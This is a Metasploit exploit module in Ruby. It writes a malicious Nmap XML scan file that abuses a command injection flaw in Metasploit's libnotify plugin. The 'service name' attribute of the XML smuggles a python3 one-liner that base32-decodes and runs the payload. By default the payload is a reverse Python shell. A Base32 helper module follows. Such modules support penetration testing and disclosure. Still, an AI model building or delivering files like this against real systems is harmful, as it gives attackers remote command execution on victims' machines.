##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Metasploit Libnotify Plugin Arbitrary Command Execution',
      'Description'    => %q{
        This module exploits a shell command injection vulnerability in the
        libnotify plugin. This vulnerability affects Metasploit versions
        5.0.79 and earlier.
      },
      'DisclosureDate' => 'Mar 04 2020',
      'License'        => GPL_LICENSE,
      'Author'         =>
        [
          'pasta <jaguinaga@faradaysec.com>' # Discovery and PoC
        ],
      'References'     =>
        [
          [ 'URL', 'https://github.com/rapid7/metasploit-framework/issues/13026' ]
        ],
      'Platform'      => 'unix',
      'Arch'           => ARCH_CMD,
      'Payload' =>
        {
          'DisableNops' => true
        },
      'DefaultOptions' =>
        {
          'PAYLOAD' => 'cmd/unix/reverse_python'
        },
      'Targets' => [[ 'Automatic', {}]],
      'Privileged' => false,
      'DefaultTarget' => 0))

    register_options(
      [
        OptString.new('FILENAME', [false, 'The file to write.', 'scan.xml']),
      ])
  end

  def exploit
    xml = %Q(<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE nmaprun>
<nmaprun scanner="nmap" args="nmap -P0 -oA pepito 192.168.20.121" start="1583503480" startstr="Fri Mar  6 11:04:40 2020" version="7.60" xmloutputversion="1.04">
<host starttime="1583503480" endtime="1583503480"><status state="up" reason="user-set" reason_ttl="0"/>
<address addr="192.168.20.121" addrtype="ipv4"/>
<hostnames>
</hostnames>
<ports>
<port protocol="tcp" portid="22"><state state="open" reason="syn-ack" reason_ttl="0"/><service name="ssh';python3 -c &quot;import os,base64;os.system(base64.b32decode(b'#{Base32.encode(payload.encoded)}'.upper()))&quot;&amp;; printf '" method="table" conf="3"/></port>
</ports>
<times srtt="6174" rttvar="435" to="100000"/>
</host>
<runstats><finished time="1583503480" timestr="Fri Mar  6 11:04:40 2020" elapsed="0.22" summary="Nmap done at Fri Mar  6 11:04:40 2020; 1 IP address (1 host up) scanned in 0.22 seconds" exit="success"/><hosts up="1" down="0" total="1"/>
</runstats>
</nmaprun>
)

    print_status "Writing xml file: #{datastore['FILENAME']}"
    file_create xml
  end
end

module Base32
  TABLE = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'.freeze
  @table = TABLE

  class <<self
    attr_reader :table
  end

  class Chunk
    def initialize(bytes)
      @bytes = bytes
    end

    def decode
      bytes = @bytes.take_while {|c| c != 61} # strip padding
      n = (bytes.length * 5.0 / 8.0).floor
      p = bytes.length < 8 ? 5 - (n * 8) % 5 : 0
      c = bytes.inject(0) do |m,o|
        i = Base32.table.index(o.chr)
        raise ArgumentError, "invalid character '#{o.chr}'" if i.nil?
        (m << 5) + i
      end >> p
      (0..n-1).to_a.reverse.collect {|i| ((c >> i * 8) & 0xff).chr}
    end

    def encode
      n = (@bytes.length * 8.0 / 5.0).ceil
      p = n < 8 ? 5 - (@bytes.length * 8) % 5 : 0
      c = @bytes.inject(0) {|m,o| (m << 8) + o} << p
      [(0..n-1).to_a.reverse.collect {|i| Base32.table[(c >> i * 5) & 0x1f].chr},
       ("=" * (8-n))]
    end
  end

  def self.chunks(str, size)
    result = []
    bytes = str.bytes
    while bytes.any? do
      result << Chunk.new(bytes.take(size))
      bytes = bytes.drop(size)
    end
    result
  end

  def self.encode(str)
    chunks(str, 5).collect(&:encode).flatten.join
  end

  def self.decode(str)
    chunks(str, 8).collect(&:decode).flatten.join
  end

  def self.random_base32(length=16, padding=true)
    random = ''
    OpenSSL::Random.random_bytes(length).each_byte do |b|
      random << self.table[b % 32]
    end
    padding ? random.ljust((length / 8.0).ceil * 8, '=') : random
  end

  def self.table=(table)
    raise ArgumentError, "Table must have 32 unique characters" unless self.table_valid?(table)
    @table = table
  end

  def self.table_valid?(table)
    table.bytes.to_a.size == 32 && table.bytes.to_a.uniq.size == 32
  end
end
